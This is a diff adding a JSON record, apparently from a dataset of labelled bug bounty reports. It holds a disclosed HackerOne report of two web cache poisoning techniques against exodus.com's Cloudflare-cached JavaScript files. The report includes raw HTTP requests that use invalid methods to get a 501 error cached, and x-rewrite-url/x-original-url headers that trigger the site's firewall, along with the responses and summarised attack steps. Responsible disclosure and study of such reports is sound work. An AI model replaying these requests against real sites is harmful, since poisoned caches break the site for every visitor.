@@ -1,0 +1,38 @@
+{
+    "reported_to": "Exodus",
+    "reported_by": "setiawan_ ",
+    "title": "2 Cache Poisoning Attack Methods Affect Core Functionality www.exodus.com",
+    "content": "\nSummary:\nwww.exodus.com hosts static js and css files on Server: cloudflare . Which is cached by cloudflare and passed to all other users accessing the source. I was able to impact the core functionality by using a custom HTTP. Here are 2 details of the Bug.\nSteps To Reproduce:\n1. 501 Not Implemented\nAt https://www.exodus.com/, I was able to impact core functionality by using an invalid custom HTTP header to replace the JavaScript file from https://www.exodus.com/webpack-runtime-d5cfa86b8e358efc5db3-v2.js with message '501 Not Implemented'.\nCode 96 Bytes\n1ERROR /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1\n2Host: www.exodus.com\nCode 96 Bytes\n1CRASH /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1\n2Host: www.exodus.com\nResponse :\nCode 458 Bytes\n1HTTP/1.1 501 Not Implemented\n2Date: Wed, 25 May 2022 22:07:00 GMT\n3Content-Length: 0\n4Connection: keep-alive\n5Expect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\n6Strict-Transport-Security: max-age=15552000; includeSubDomains; preload\n7Set-Cookie: __cfruid=5132a5357442dd861d107824c86a39a95057bcaf-1653516420; path=/; domain=.exodus.com; HttpOnly; Secure; SameSite=None\n8Server: cloudflare\n9CF-RAY: 711194da3f3fa131-SIN\n( HTTP ) My custom CRASH & ERROR to fulfill a request does not work or is not found on the server this server establishes communication between the client and the server to be interrupted . Note that the CF-RAY value changes every time we send a request. CF-RAY is a hash value that encodes information about the data center and requests.\n2. Cache poisoning triggers Firewall Exodus\nWhen you poison a .js / .css file with additional 2 headers namely : x-rewrite-url & x-original-url it will trigger the exodus firewall rule.\nGET request:\nCode 115 Bytes\n1GET /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1\n2Host: www.exodus.com\n3x-rewrite-url: /root\nCode 116 Bytes\n1GET /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1\n2Host: www.exodus.com\n3x-original-url: /root\nPay attention to the GET request. It looks different if you open the response in a browser, it will make a POST. Logically, if the POST, DELETE or PURGE methods are not allowed it will issue a response POST is not a valid request method ( 500 Internal Server Error ) However with 2 additional headers x-rewrite-url & x-original-url it actually makes a POST request to the internal system, interesting is not it? :\nCode 95 Bytes\n1POST /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1\n2Host: www.exodus.com\nResponse :\nCode 325 Bytes\n1HTTP/1.1 403 Forbidden\n2Server: cloudflare\n3CF-RAY: 7111ab2b8cd191c6-SIN\n4\n5<!DOCTYPE html>\n6<html lang=\"en\">\n7  <head>\n8    <meta charset=\"utf-8\" />\n9    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n10    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n11\n12    <title>Exodus - Firewall Triggered</title>\nSupporting Material/References:\nCrash501NotImplemented.png (F1744429): Crash501NotImplemented.png\nFirewallTriggeredWithCachePoison.png (F1744430): FirewallTriggeredWithCachePoison.png\nPostRequestTriggeredFirewall.png (F1744431): PostRequestTriggeredFirewall.png\nNote: I've added in the User-Agent header to help with problem tracking. https://hackerone.com/bismillahfortuner?type=user\nUser-Agent: h1-<bismillahfortuner>\nImpact\nwww.exodus.com hosts static js and css files on Server: cloudflare . Which is cached by cloudflare and passed to all other users accessing the source. I was able to impact the core functionality by using a custom HTTP. And I can trigger exodus firewall rules using cache poisoning\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1654529460,
+    "report_url": "https://hackerone.com/reports/1581454",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a custom HTTP request with an invalid header (CRASH or ERROR) to the target JavaScript file (e.g., /webpack-runtime-d5cfa86b8e358efc5db3-v2.js) to trigger a 501 Not Implemented response, poisoning the Cloudflare cache."
+        ],
+        [
+            2,
+            "Inject custom headers (x-rewrite-url or x-original-url) into a GET request for a static file (e.g., .js/.css) to trigger a POST request internally, causing the Exodus firewall to block the request."
+        ]
+    ],
+    "vuln_description": "The vulnerability involves two cache poisoning attacks on Exodus.com's Cloudflare-hosted static files. The first attack disrupts core functionality by forcing Cloudflare to cache a 501 error response for critical JavaScript files. The second attack manipulates request headers to trigger unintended POST requests, activating the Exodus firewall rules.",
+    "reason": "The attack requires understanding Cloudflare caching behavior, crafting specific malformed HTTP requests, and identifying header manipulation techniques that trigger backend anomalies. While the components (cache poisoning, header injection) are known, combining them to exploit Cloudflare's caching and Exodus's firewall logic requires careful observation and testing.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
